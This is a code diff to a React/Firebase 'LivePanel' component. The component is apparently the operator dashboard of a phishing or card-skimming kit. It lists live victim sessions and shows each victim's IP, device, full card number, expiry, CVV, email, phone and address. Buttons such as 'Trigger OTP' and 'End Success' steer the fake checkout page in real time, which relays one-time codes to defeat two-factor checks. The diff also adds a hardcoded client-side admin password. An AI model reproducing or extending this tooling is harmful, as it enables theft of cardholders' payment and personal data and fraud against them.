@@ -2,12 +2,32 @@
 
 import { useEffect, useState, useRef } from "react";
 import { useParams } from "next/navigation";
-import { ref, onValue, update, set } from "firebase/database";
-import { db } from "@/lib/firebase";
+import { db as database } from "@/lib/firebase";
+import { ref, onValue, push, set } from "firebase/database";
 import {
-    Smartphone, Monitor, CreditCard, Globe, Clock, Terminal, Shield, MessageSquare
+    Activity,
+    CreditCard,
+    Globe,
+    MapPin,
+    MessageSquare,
+    Monitor,
+    Shield,
+    Smartphone,
+    Terminal,
+    Clock,
+    Wifi,
+    Lock,
+    Eye,
+    EyeOff
 } from "lucide-react";
 import CardVisual from "@/components/CardVisual";
+
+interface LogEntry {
+    id: string;
+    type: "info" | "input" | "otp" | "error" | "success";
+    message: string;
+    timestamp: number;
+}
 
 interface SessionData {
     id: string;
@@ -28,124 +48,208 @@ interface SessionData {
     status: "active" | "success" | "failed";
     lastActive: number;
     currentLocation?: string;
-    logs: LogEntry[];
+    logs?: Record<string, LogEntry>; // Firebase returns objects for lists usually
 }
 
-interface LogEntry {
-    id: string;
-    type: "info" | "input" | "otp" | "error" | "success";
-    message: string;
-    timestamp: number;
-}
+// Helper to convert logs object to array
+const getLogsArray = (logs?: Record<string, LogEntry>): LogEntry[] => {
+    if (!logs) return [];
+    return Object.values(logs).sort((a, b) => a.timestamp - b.timestamp);
+};
 
 export default function LivePanel() {
     const params = useParams();
     const projectId = params.projectId as string;
-    const [sessions, setSessions] = useState<SessionData[]>([]);
+    const [sessions, setSessions] = useState<Record<string, SessionData>>({});
     const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
     const chatEndRef = useRef<HTMLDivElement>(null);
 
-    // Real-time Data Listener
+    // Login State
+    const [isLoggedIn, setIsLoggedIn] = useState(false);
+    const [passwordInput, setPasswordInput] = useState("");
+    const [loginError, setLoginError] = useState(false);
+    const [showPassword, setShowPassword] = useState(false);
+
+    // 1. Handle Login Persistence & Auth
     useEffect(() => {
-        const sessionsRef = ref(db, `projects/${projectId}/sessions`);
+        const storedAuth = localStorage.getItem("admin_auth_timestamp");
+        if (storedAuth) {
+            const lastActive = parseInt(storedAuth);
+            const now = Date.now();
+            // 15 minutes expiration (15 * 60 * 1000 = 900000)
+            if (now - lastActive < 900000) {
+                setIsLoggedIn(true);
+                // Refresh timestamp
+                localStorage.setItem("admin_auth_timestamp", now.toString());
+            } else {
+                localStorage.removeItem("admin_auth_timestamp");
+            }
+        }
+    }, []);
+
+    const handleLogin = (e: React.FormEvent) => {
+        e.preventDefault();
+        if (passwordInput === "Tatta@1337") {
+            setIsLoggedIn(true);
+            setLoginError(false);
+            localStorage.setItem("admin_auth_timestamp", Date.now().toString());
+        } else {
+            setLoginError(true);
+            setPasswordInput("");
+        }
+    };
+
+    // 2. Firebase Listener (Only if logged in)
+    useEffect(() => {
+        if (!projectId || !isLoggedIn) return;
+
+        const sessionsRef = ref(database, `projects/${projectId}/sessions`);
         const unsubscribe = onValue(sessionsRef, (snapshot) => {
             const data = snapshot.val();
             if (data) {
-                const sessionList = Object.values(data) as SessionData[];
-                // Sort by last active
-                sessionList.sort((a, b) => b.lastActive - a.lastActive);
-                setSessions(sessionList);
-
+                setSessions(data);
                 // Auto-select first session if none selected
-                if (!selectedSessionId && sessionList.length > 0) {
-                    setSelectedSessionId(sessionList[0].id);
+                if (!selectedSessionId) {
+                    const ids = Object.keys(data);
+                    if (ids.length > 0) setSelectedSessionId(ids[0]);
                 }
             } else {
-                setSessions([]);
+                setSessions({});
             }
         });
 
         return () => unsubscribe();
-    }, [projectId, selectedSessionId]);
+    }, [projectId, isLoggedIn, selectedSessionId]);
 
-    const selectedSession = sessions.find(s => s.id === selectedSessionId);
+    // 3. Auto-scroll chat
+    const selectedSession = selectedSessionId ? sessions[selectedSessionId] : null;
+    const logs = selectedSession ? getLogsArray(selectedSession.logs) : [];
 
-    const sendCommand = (command: string) => {
-        if (!selectedSession) return;
-        console.log(`Sending command: ${command}`);
-        update(ref(db, `projects/${projectId}/sessions/${selectedSession.id}/command`), {
-            code: command,
+    useEffect(() => {
+        chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
+    }, [logs]);
+
+    // 4. Send Command
+    const sendCommand = (cmd: string) => {
+        if (!selectedSessionId || !projectId) return;
+
+        // Push command to session
+        const commandRef = ref(database, `projects/${projectId}/sessions/${selectedSessionId}/command`);
+        set(commandRef, {
+            type: cmd,
             timestamp: Date.now()
         });
 
-        // Also set the raw command string for the simple listener in checkout
-        set(ref(db, `projects/${projectId}/sessions/${selectedSession.id}/command`), command);
+        // Log it locally for the admin to see
+        const logsRef = ref(database, `projects/${projectId}/sessions/${selectedSessionId}/logs`);
+        const newLogRef = push(logsRef);
+        set(newLogRef, {
+            id: newLogRef.key,
+            type: "info",
+            message: `Admin sent command: ${cmd}`,
+            timestamp: Date.now()
+        });
     };
 
-    // Auto-scroll chat
-    useEffect(() => {
-        chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
-    }, [selectedSession?.logs]);
+    // --- RENDER LOGIN SCREEN ---
+    if (!isLoggedIn) {
+        return (
+            <div className="min-h-screen bg-[#0b0e14] flex items-center justify-center p-4">
+                <div className="w-full max-w-md bg-[#11141d] border border-white/5 rounded-2xl shadow-2xl p-8">
+                    <div className="flex flex-col items-center mb-8">
+                        <div className="w-16 h-16 bg-blue-600/20 rounded-full flex items-center justify-center mb-4 text-blue-500">
+                            <Lock className="w-8 h-8" />
+                        </div>
+                        <h1 className="text-2xl font-bold text-white tracking-tight">Admin Access</h1>
+                        <p className="text-gray-500 text-sm mt-2">Restricted area. Authorized personnel only.</p>
+                    </div>
 
-    if (!selectedSession) return <div className="bg-[#0f111a] h-screen text-white flex items-center justify-center">Waiting for connection...</div>;
+                    <form onSubmit={handleLogin} className="space-y-6">
+                        <div className="space-y-2">
+                            <label className="text-xs font-bold text-gray-500 uppercase tracking-wider">Password</label>
+                            <div className="relative">
+                                <input
+                                    type={showPassword ? "text" : "password"}
+                                    value={passwordInput}
+                                    onChange={(e) => setPasswordInput(e.target.value)}
+                                    className="w-full bg-[#0b0e14] border border-white/10 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-blue-500 transition-colors pr-10"
+                                    placeholder="Enter access code..."
+                                />
+                                <button
+                                    type="button"
+                                    onClick={() => setShowPassword(!showPassword)}
+                                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300"
+                                >
+                                    {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                                </button>
+                            </div>
+                            {loginError && (
+                                <p className="text-red-500 text-xs mt-1 animate-pulse">Access denied. Invalid credentials.</p>
+                            )}
+                        </div>
 
+                        <button
+                            type="submit"
+                            className="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-lg transition-all transform active:scale-95 shadow-lg shadow-blue-900/20"
+                        >
+                            Unlock Dashboard
+                        </button>
+                    </form>
+
+                    <div className="mt-8 text-center">
+                        <p className="text-[10px] text-gray-600 uppercase tracking-widest">
+                            Secure Terminal v2.0.4
+                        </p>
+                    </div>
+                </div>
+            </div>
+        );
+    }
+
+    // --- RENDER DASHBOARD ---
+    // Always render the layout, handle empty session inside fields
     return (
-        <div className="flex h-screen bg-[#0b0e14] text-gray-300 font-sans overflow-hidden">
+        <div className="flex h-screen bg-[#0b0e14] text-white font-sans overflow-hidden">
 
-            {/* LEFT COLUMN: Browser Info */}
+            {/* LEFT COLUMN: Browser Info & Session List */}
             <div className="w-80 bg-[#11141d] border-r border-white/5 flex flex-col">
                 <div className="p-4 border-b border-white/5 bg-[#161b26]">
                     <h2 className="text-xs font-bold uppercase tracking-widest text-blue-400 flex items-center gap-2">
-                        <Globe className="w-4 h-4" /> Browser Info
+                        <Globe className="w-4 h-4" /> Active Sessions
                     </h2>
                 </div>
-                <div className="p-4 space-y-6 overflow-y-auto flex-1">
+                <div className="p-4 space-y-2 overflow-y-auto flex-1">
+                    {/* Session List */}
+                    {Object.keys(sessions).length === 0 ? (
+                        <div className="text-gray-500 text-xs text-center py-4">No active users</div>
+                    ) : (
+                        Object.values(sessions).map(s => (
+                            <div
+                                key={s.id}
+                                onClick={() => setSelectedSessionId(s.id)}
+                                className={`p-3 rounded cursor-pointer border ${selectedSessionId === s.id ? 'bg-blue-600/10 border-blue-500/50' : 'bg-[#161b26] border-white/5 hover:border-white/10'}`}
+                            >
+                                <div className="flex justify-between items-center mb-1">
+                                    <span className="font-mono text-xs text-blue-300">#{s.id.substring(0, 4)}</span>
+                                    {s.status === 'active' && <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>}
+                                </div>
+                                <div className="text-[10px] text-gray-500 truncate">{s.currentLocation || "Unknown"}</div>
+                            </div>
+                        ))
+                    )}
+                </div>
 
-                    {/* User Agent */}
-                    <div className="space-y-2">
-                        <label className="text-xs font-bold text-gray-500 uppercase">User Agent</label>
-                        <div className="bg-[#0b0e14] p-3 rounded border border-white/5 text-xs font-mono break-words text-gray-400">
-                            {selectedSession.ua || "Unknown"}
-                        </div>
-                    </div>
-
-                    {/* IP & Country */}
-                    <div className="space-y-2">
-                        <label className="text-xs font-bold text-gray-500 uppercase">IP & Country</label>
-                        <div className="flex items-center gap-2">
-                            <div className="h-2 w-2 rounded-full bg-green-500 animate-pulse"></div>
-                            <span className="text-white font-mono">{selectedSession.ip || "127.0.0.1"}</span>
-                            <span className="text-xs bg-blue-500/20 text-blue-400 px-2 py-0.5 rounded">US</span>
-                        </div>
-                    </div>
-
-                    {/* Timezone */}
-                    <div className="space-y-2">
-                        <label className="text-xs font-bold text-gray-500 uppercase">Timezone</label>
-                        <div className="flex items-center gap-2 text-sm">
-                            <Clock className="w-4 h-4 text-gray-500" />
-                            <span>America/New_York (EST)</span>
-                        </div>
-                    </div>
-
-                    {/* Screen Size */}
-                    <div className="space-y-2">
-                        <label className="text-xs font-bold text-gray-500 uppercase">Screen Size</label>
-                        <div className="flex items-center gap-2 text-sm">
-                            <Monitor className="w-4 h-4 text-gray-500" />
-                            <span>390 x 844 (Mobile)</span>
-                        </div>
-                    </div>
-
-                    {/* Platform */}
-                    <div className="space-y-2">
-                        <label className="text-xs font-bold text-gray-500 uppercase">Platform / CPU</label>
-                        <div className="flex items-center gap-2 text-sm">
-                            <Smartphone className="w-4 h-4 text-gray-500" />
-                            <span>iPhone / iOS 16.0</span>
-                        </div>
-                    </div>
-
+                {/* Browser Info (Bottom of Left Col) */}
+                <div className="p-4 border-t border-white/5 bg-[#161b26] space-y-4">
+                    <h3 className="text-[10px] font-bold uppercase text-gray-500">Device Info {selectedSession ? "" : "(Select Session)"}</h3>
+                    {selectedSession ? (
+                        <>
+                            <div className="text-xs text-gray-300 truncate" title={selectedSession.ua}>{selectedSession.device}</div>
+                            <div className="text-xs text-gray-400 font-mono">{selectedSession.ip || "127.0.0.1"}</div>
+                        </>
+                    ) : (
+                        <div className="text-xs text-gray-600 italic">No session selected</div>
+                    )}
                 </div>
             </div>
 
@@ -153,33 +257,42 @@ export default function LivePanel() {
             <div className="flex-1 flex flex-col bg-[#0b0e14] relative">
                 <div className="p-4 border-b border-white/5 bg-[#11141d] flex justify-between items-center">
                     <h2 className="text-xs font-bold uppercase tracking-widest text-blue-400 flex items-center gap-2">
-                        <MessageSquare className="w-4 h-4" /> Chat Box (Live Events)
+                        <MessageSquare className="w-4 h-4" /> Live Events
                     </h2>
                     <div className="flex items-center gap-2 text-xs">
-                        <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
-                        <span className="text-green-400">Connected</span>
+                        <span className={`w-2 h-2 rounded-full ${selectedSession ? 'bg-green-500 animate-pulse' : 'bg-red-500'}`}></span>
+                        <span className={selectedSession ? 'text-green-400' : 'text-red-400'}>{selectedSession ? 'Connected' : 'Disconnected'}</span>
                     </div>
                 </div>
 
                 {/* Chat Area */}
                 <div className="flex-1 overflow-y-auto p-4 space-y-4">
-                    {selectedSession.logs && selectedSession.logs.map((log) => (
-                        <div key={log.id} className={`flex ${log.type === 'input' ? 'justify-end' : 'justify-start'}`}>
-                            <div className={`max-w-[80%] rounded-lg p-3 text-sm ${log.type === 'input'
-                                    ? 'bg-blue-600/20 border border-blue-500/30 text-blue-100'
-                                    : log.type === 'otp'
-                                        ? 'bg-yellow-600/20 border border-yellow-500/30 text-yellow-100'
-                                        : 'bg-[#161b26] border border-white/5 text-gray-300'
-                                }`}>
-                                <div className="flex items-center gap-2 mb-1 opacity-50 text-[10px] uppercase tracking-wider">
-                                    {log.type === 'input' ? <Terminal className="w-3 h-3" /> : <Shield className="w-3 h-3" />}
-                                    <span>{new Date(log.timestamp).toLocaleTimeString()}</span>
-                                </div>
-                                <div>{log.message}</div>
-                            </div>
+                    {!selectedSession ? (
+                        <div className="h-full flex flex-col items-center justify-center text-gray-600 opacity-50">
+                            <Wifi className="w-8 h-8 mb-2" />
+                            <p className="text-sm">Waiting for connection...</p>
                         </div>
-                    ))}
-                    <div ref={chatEndRef} />
+                    ) : (
+                        <>
+                            {logs.map((log) => (
+                                <div key={log.id} className={`flex ${log.type === 'input' ? 'justify-end' : 'justify-start'}`}>
+                                    <div className={`max-w-[80%] rounded-lg p-3 text-sm ${log.type === 'input'
+                                        ? 'bg-blue-600/20 border border-blue-500/30 text-blue-100'
+                                        : log.type === 'otp'
+                                            ? 'bg-yellow-600/20 border border-yellow-500/30 text-yellow-100'
+                                            : 'bg-[#161b26] border border-white/5 text-gray-300'
+                                        }`}>
+                                        <div className="flex items-center gap-2 mb-1 opacity-50 text-[10px] uppercase tracking-wider">
+                                            {log.type === 'input' ? <Terminal className="w-3 h-3" /> : <Shield className="w-3 h-3" />}
+                                            <span>{new Date(log.timestamp).toLocaleTimeString()}</span>
+                                        </div>
+                                        <div>{log.message}</div>
+                                    </div>
+                                </div>
+                            ))}
+                            <div ref={chatEndRef} />
+                        </>
+                    )}
                 </div>
 
                 {/* Action Bar */}
@@ -187,41 +300,31 @@ export default function LivePanel() {
                     <div className="grid grid-cols-4 gap-3">
                         <button
                             onClick={() => sendCommand("OTP")}
-                            className="bg-blue-600/20 hover:bg-blue-600/30 text-blue-400 border border-blue-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
+                            disabled={!selectedSession}
+                            className="bg-blue-600/20 hover:bg-blue-600/30 disabled:opacity-50 disabled:cursor-not-allowed text-blue-400 border border-blue-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
                         >
                             Trigger OTP
                         </button>
                         <button
                             onClick={() => sendCommand("PUSH")}
-                            className="bg-purple-600/20 hover:bg-purple-600/30 text-purple-400 border border-purple-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
+                            disabled={!selectedSession}
+                            className="bg-purple-600/20 hover:bg-purple-600/30 disabled:opacity-50 disabled:cursor-not-allowed text-purple-400 border border-purple-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
                         >
                             Push Notif
                         </button>
                         <button
                             onClick={() => sendCommand("SUCCESS")}
-                            className="bg-green-600/20 hover:bg-green-600/30 text-green-400 border border-green-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
+                            disabled={!selectedSession}
+                            className="bg-green-600/20 hover:bg-green-600/30 disabled:opacity-50 disabled:cursor-not-allowed text-green-400 border border-green-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
                         >
                             End Success
                         </button>
                         <button
                             onClick={() => sendCommand("FAIL")}
-                            className="bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
+                            disabled={!selectedSession}
+                            className="bg-red-600/20 hover:bg-red-600/30 disabled:opacity-50 disabled:cursor-not-allowed text-red-400 border border-red-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
                         >
                             End Failed
-                        </button>
-                    </div>
-                    <div className="grid grid-cols-4 gap-3 mt-3">
-                        <button
-                            onClick={() => sendCommand("OTP_ERROR")}
-                            className="bg-yellow-600/20 hover:bg-yellow-600/30 text-yellow-400 border border-yellow-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
-                        >
-                            OTP Error
-                        </button>
-                        <button
-                            onClick={() => sendCommand("CARD_ERROR")}
-                            className="bg-orange-600/20 hover:bg-orange-600/30 text-orange-400 border border-orange-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
-                        >
-                            Card Error
                         </button>
                     </div>
                 </div>
@@ -242,10 +345,10 @@ export default function LivePanel() {
                         <div className="absolute -inset-1 bg-gradient-to-r from-blue-600 to-purple-600 rounded-2xl blur opacity-20 group-hover:opacity-40 transition duration-1000"></div>
                         <div className="relative">
                             <CardVisual
-                                cardNumber={selectedSession.card || ""}
-                                cardHolder={selectedSession.name || ""}
-                                expiry={selectedSession.expiry || ""}
-                                cvv={selectedSession.cvv || ""}
+                                cardNumber={selectedSession?.card || ""}
+                                cardHolder={selectedSession?.name || ""}
+                                expiry={selectedSession?.expiry || ""}
+                                cvv={selectedSession?.cvv || ""}
                             />
                         </div>
                     </div>
@@ -258,12 +361,12 @@ export default function LivePanel() {
                         </div>
                         <div className="divide-y divide-white/5">
                             {[
-                                { label: "Email", value: selectedSession.email },
-                                { label: "Phone", value: selectedSession.phone },
-                                { label: "Name", value: selectedSession.name },
-                                { label: "Address", value: selectedSession.address },
-                                { label: "City/State", value: `${selectedSession.city}, ${selectedSession.state} ${selectedSession.zip}` },
-                                { label: "Delivery", value: selectedSession.delivery?.toUpperCase() },
+                                { label: "Email", value: selectedSession?.email },
+                                { label: "Phone", value: selectedSession?.phone },
+                                { label: "Name", value: selectedSession?.name },
+                                { label: "Address", value: selectedSession?.address },
+                                { label: "City/State", value: selectedSession ? `${selectedSession.city || ''} ${selectedSession.state || ''} ${selectedSession.zip || ''}` : '' },
+                                { label: "Delivery", value: selectedSession?.delivery?.toUpperCase() },
                             ].map((item, i) => (
                                 <div key={i} className="px-4 py-3 flex flex-col gap-1">
                                     <span className="text-[10px] text-gray-500 uppercase tracking-wider">{item.label}</span>
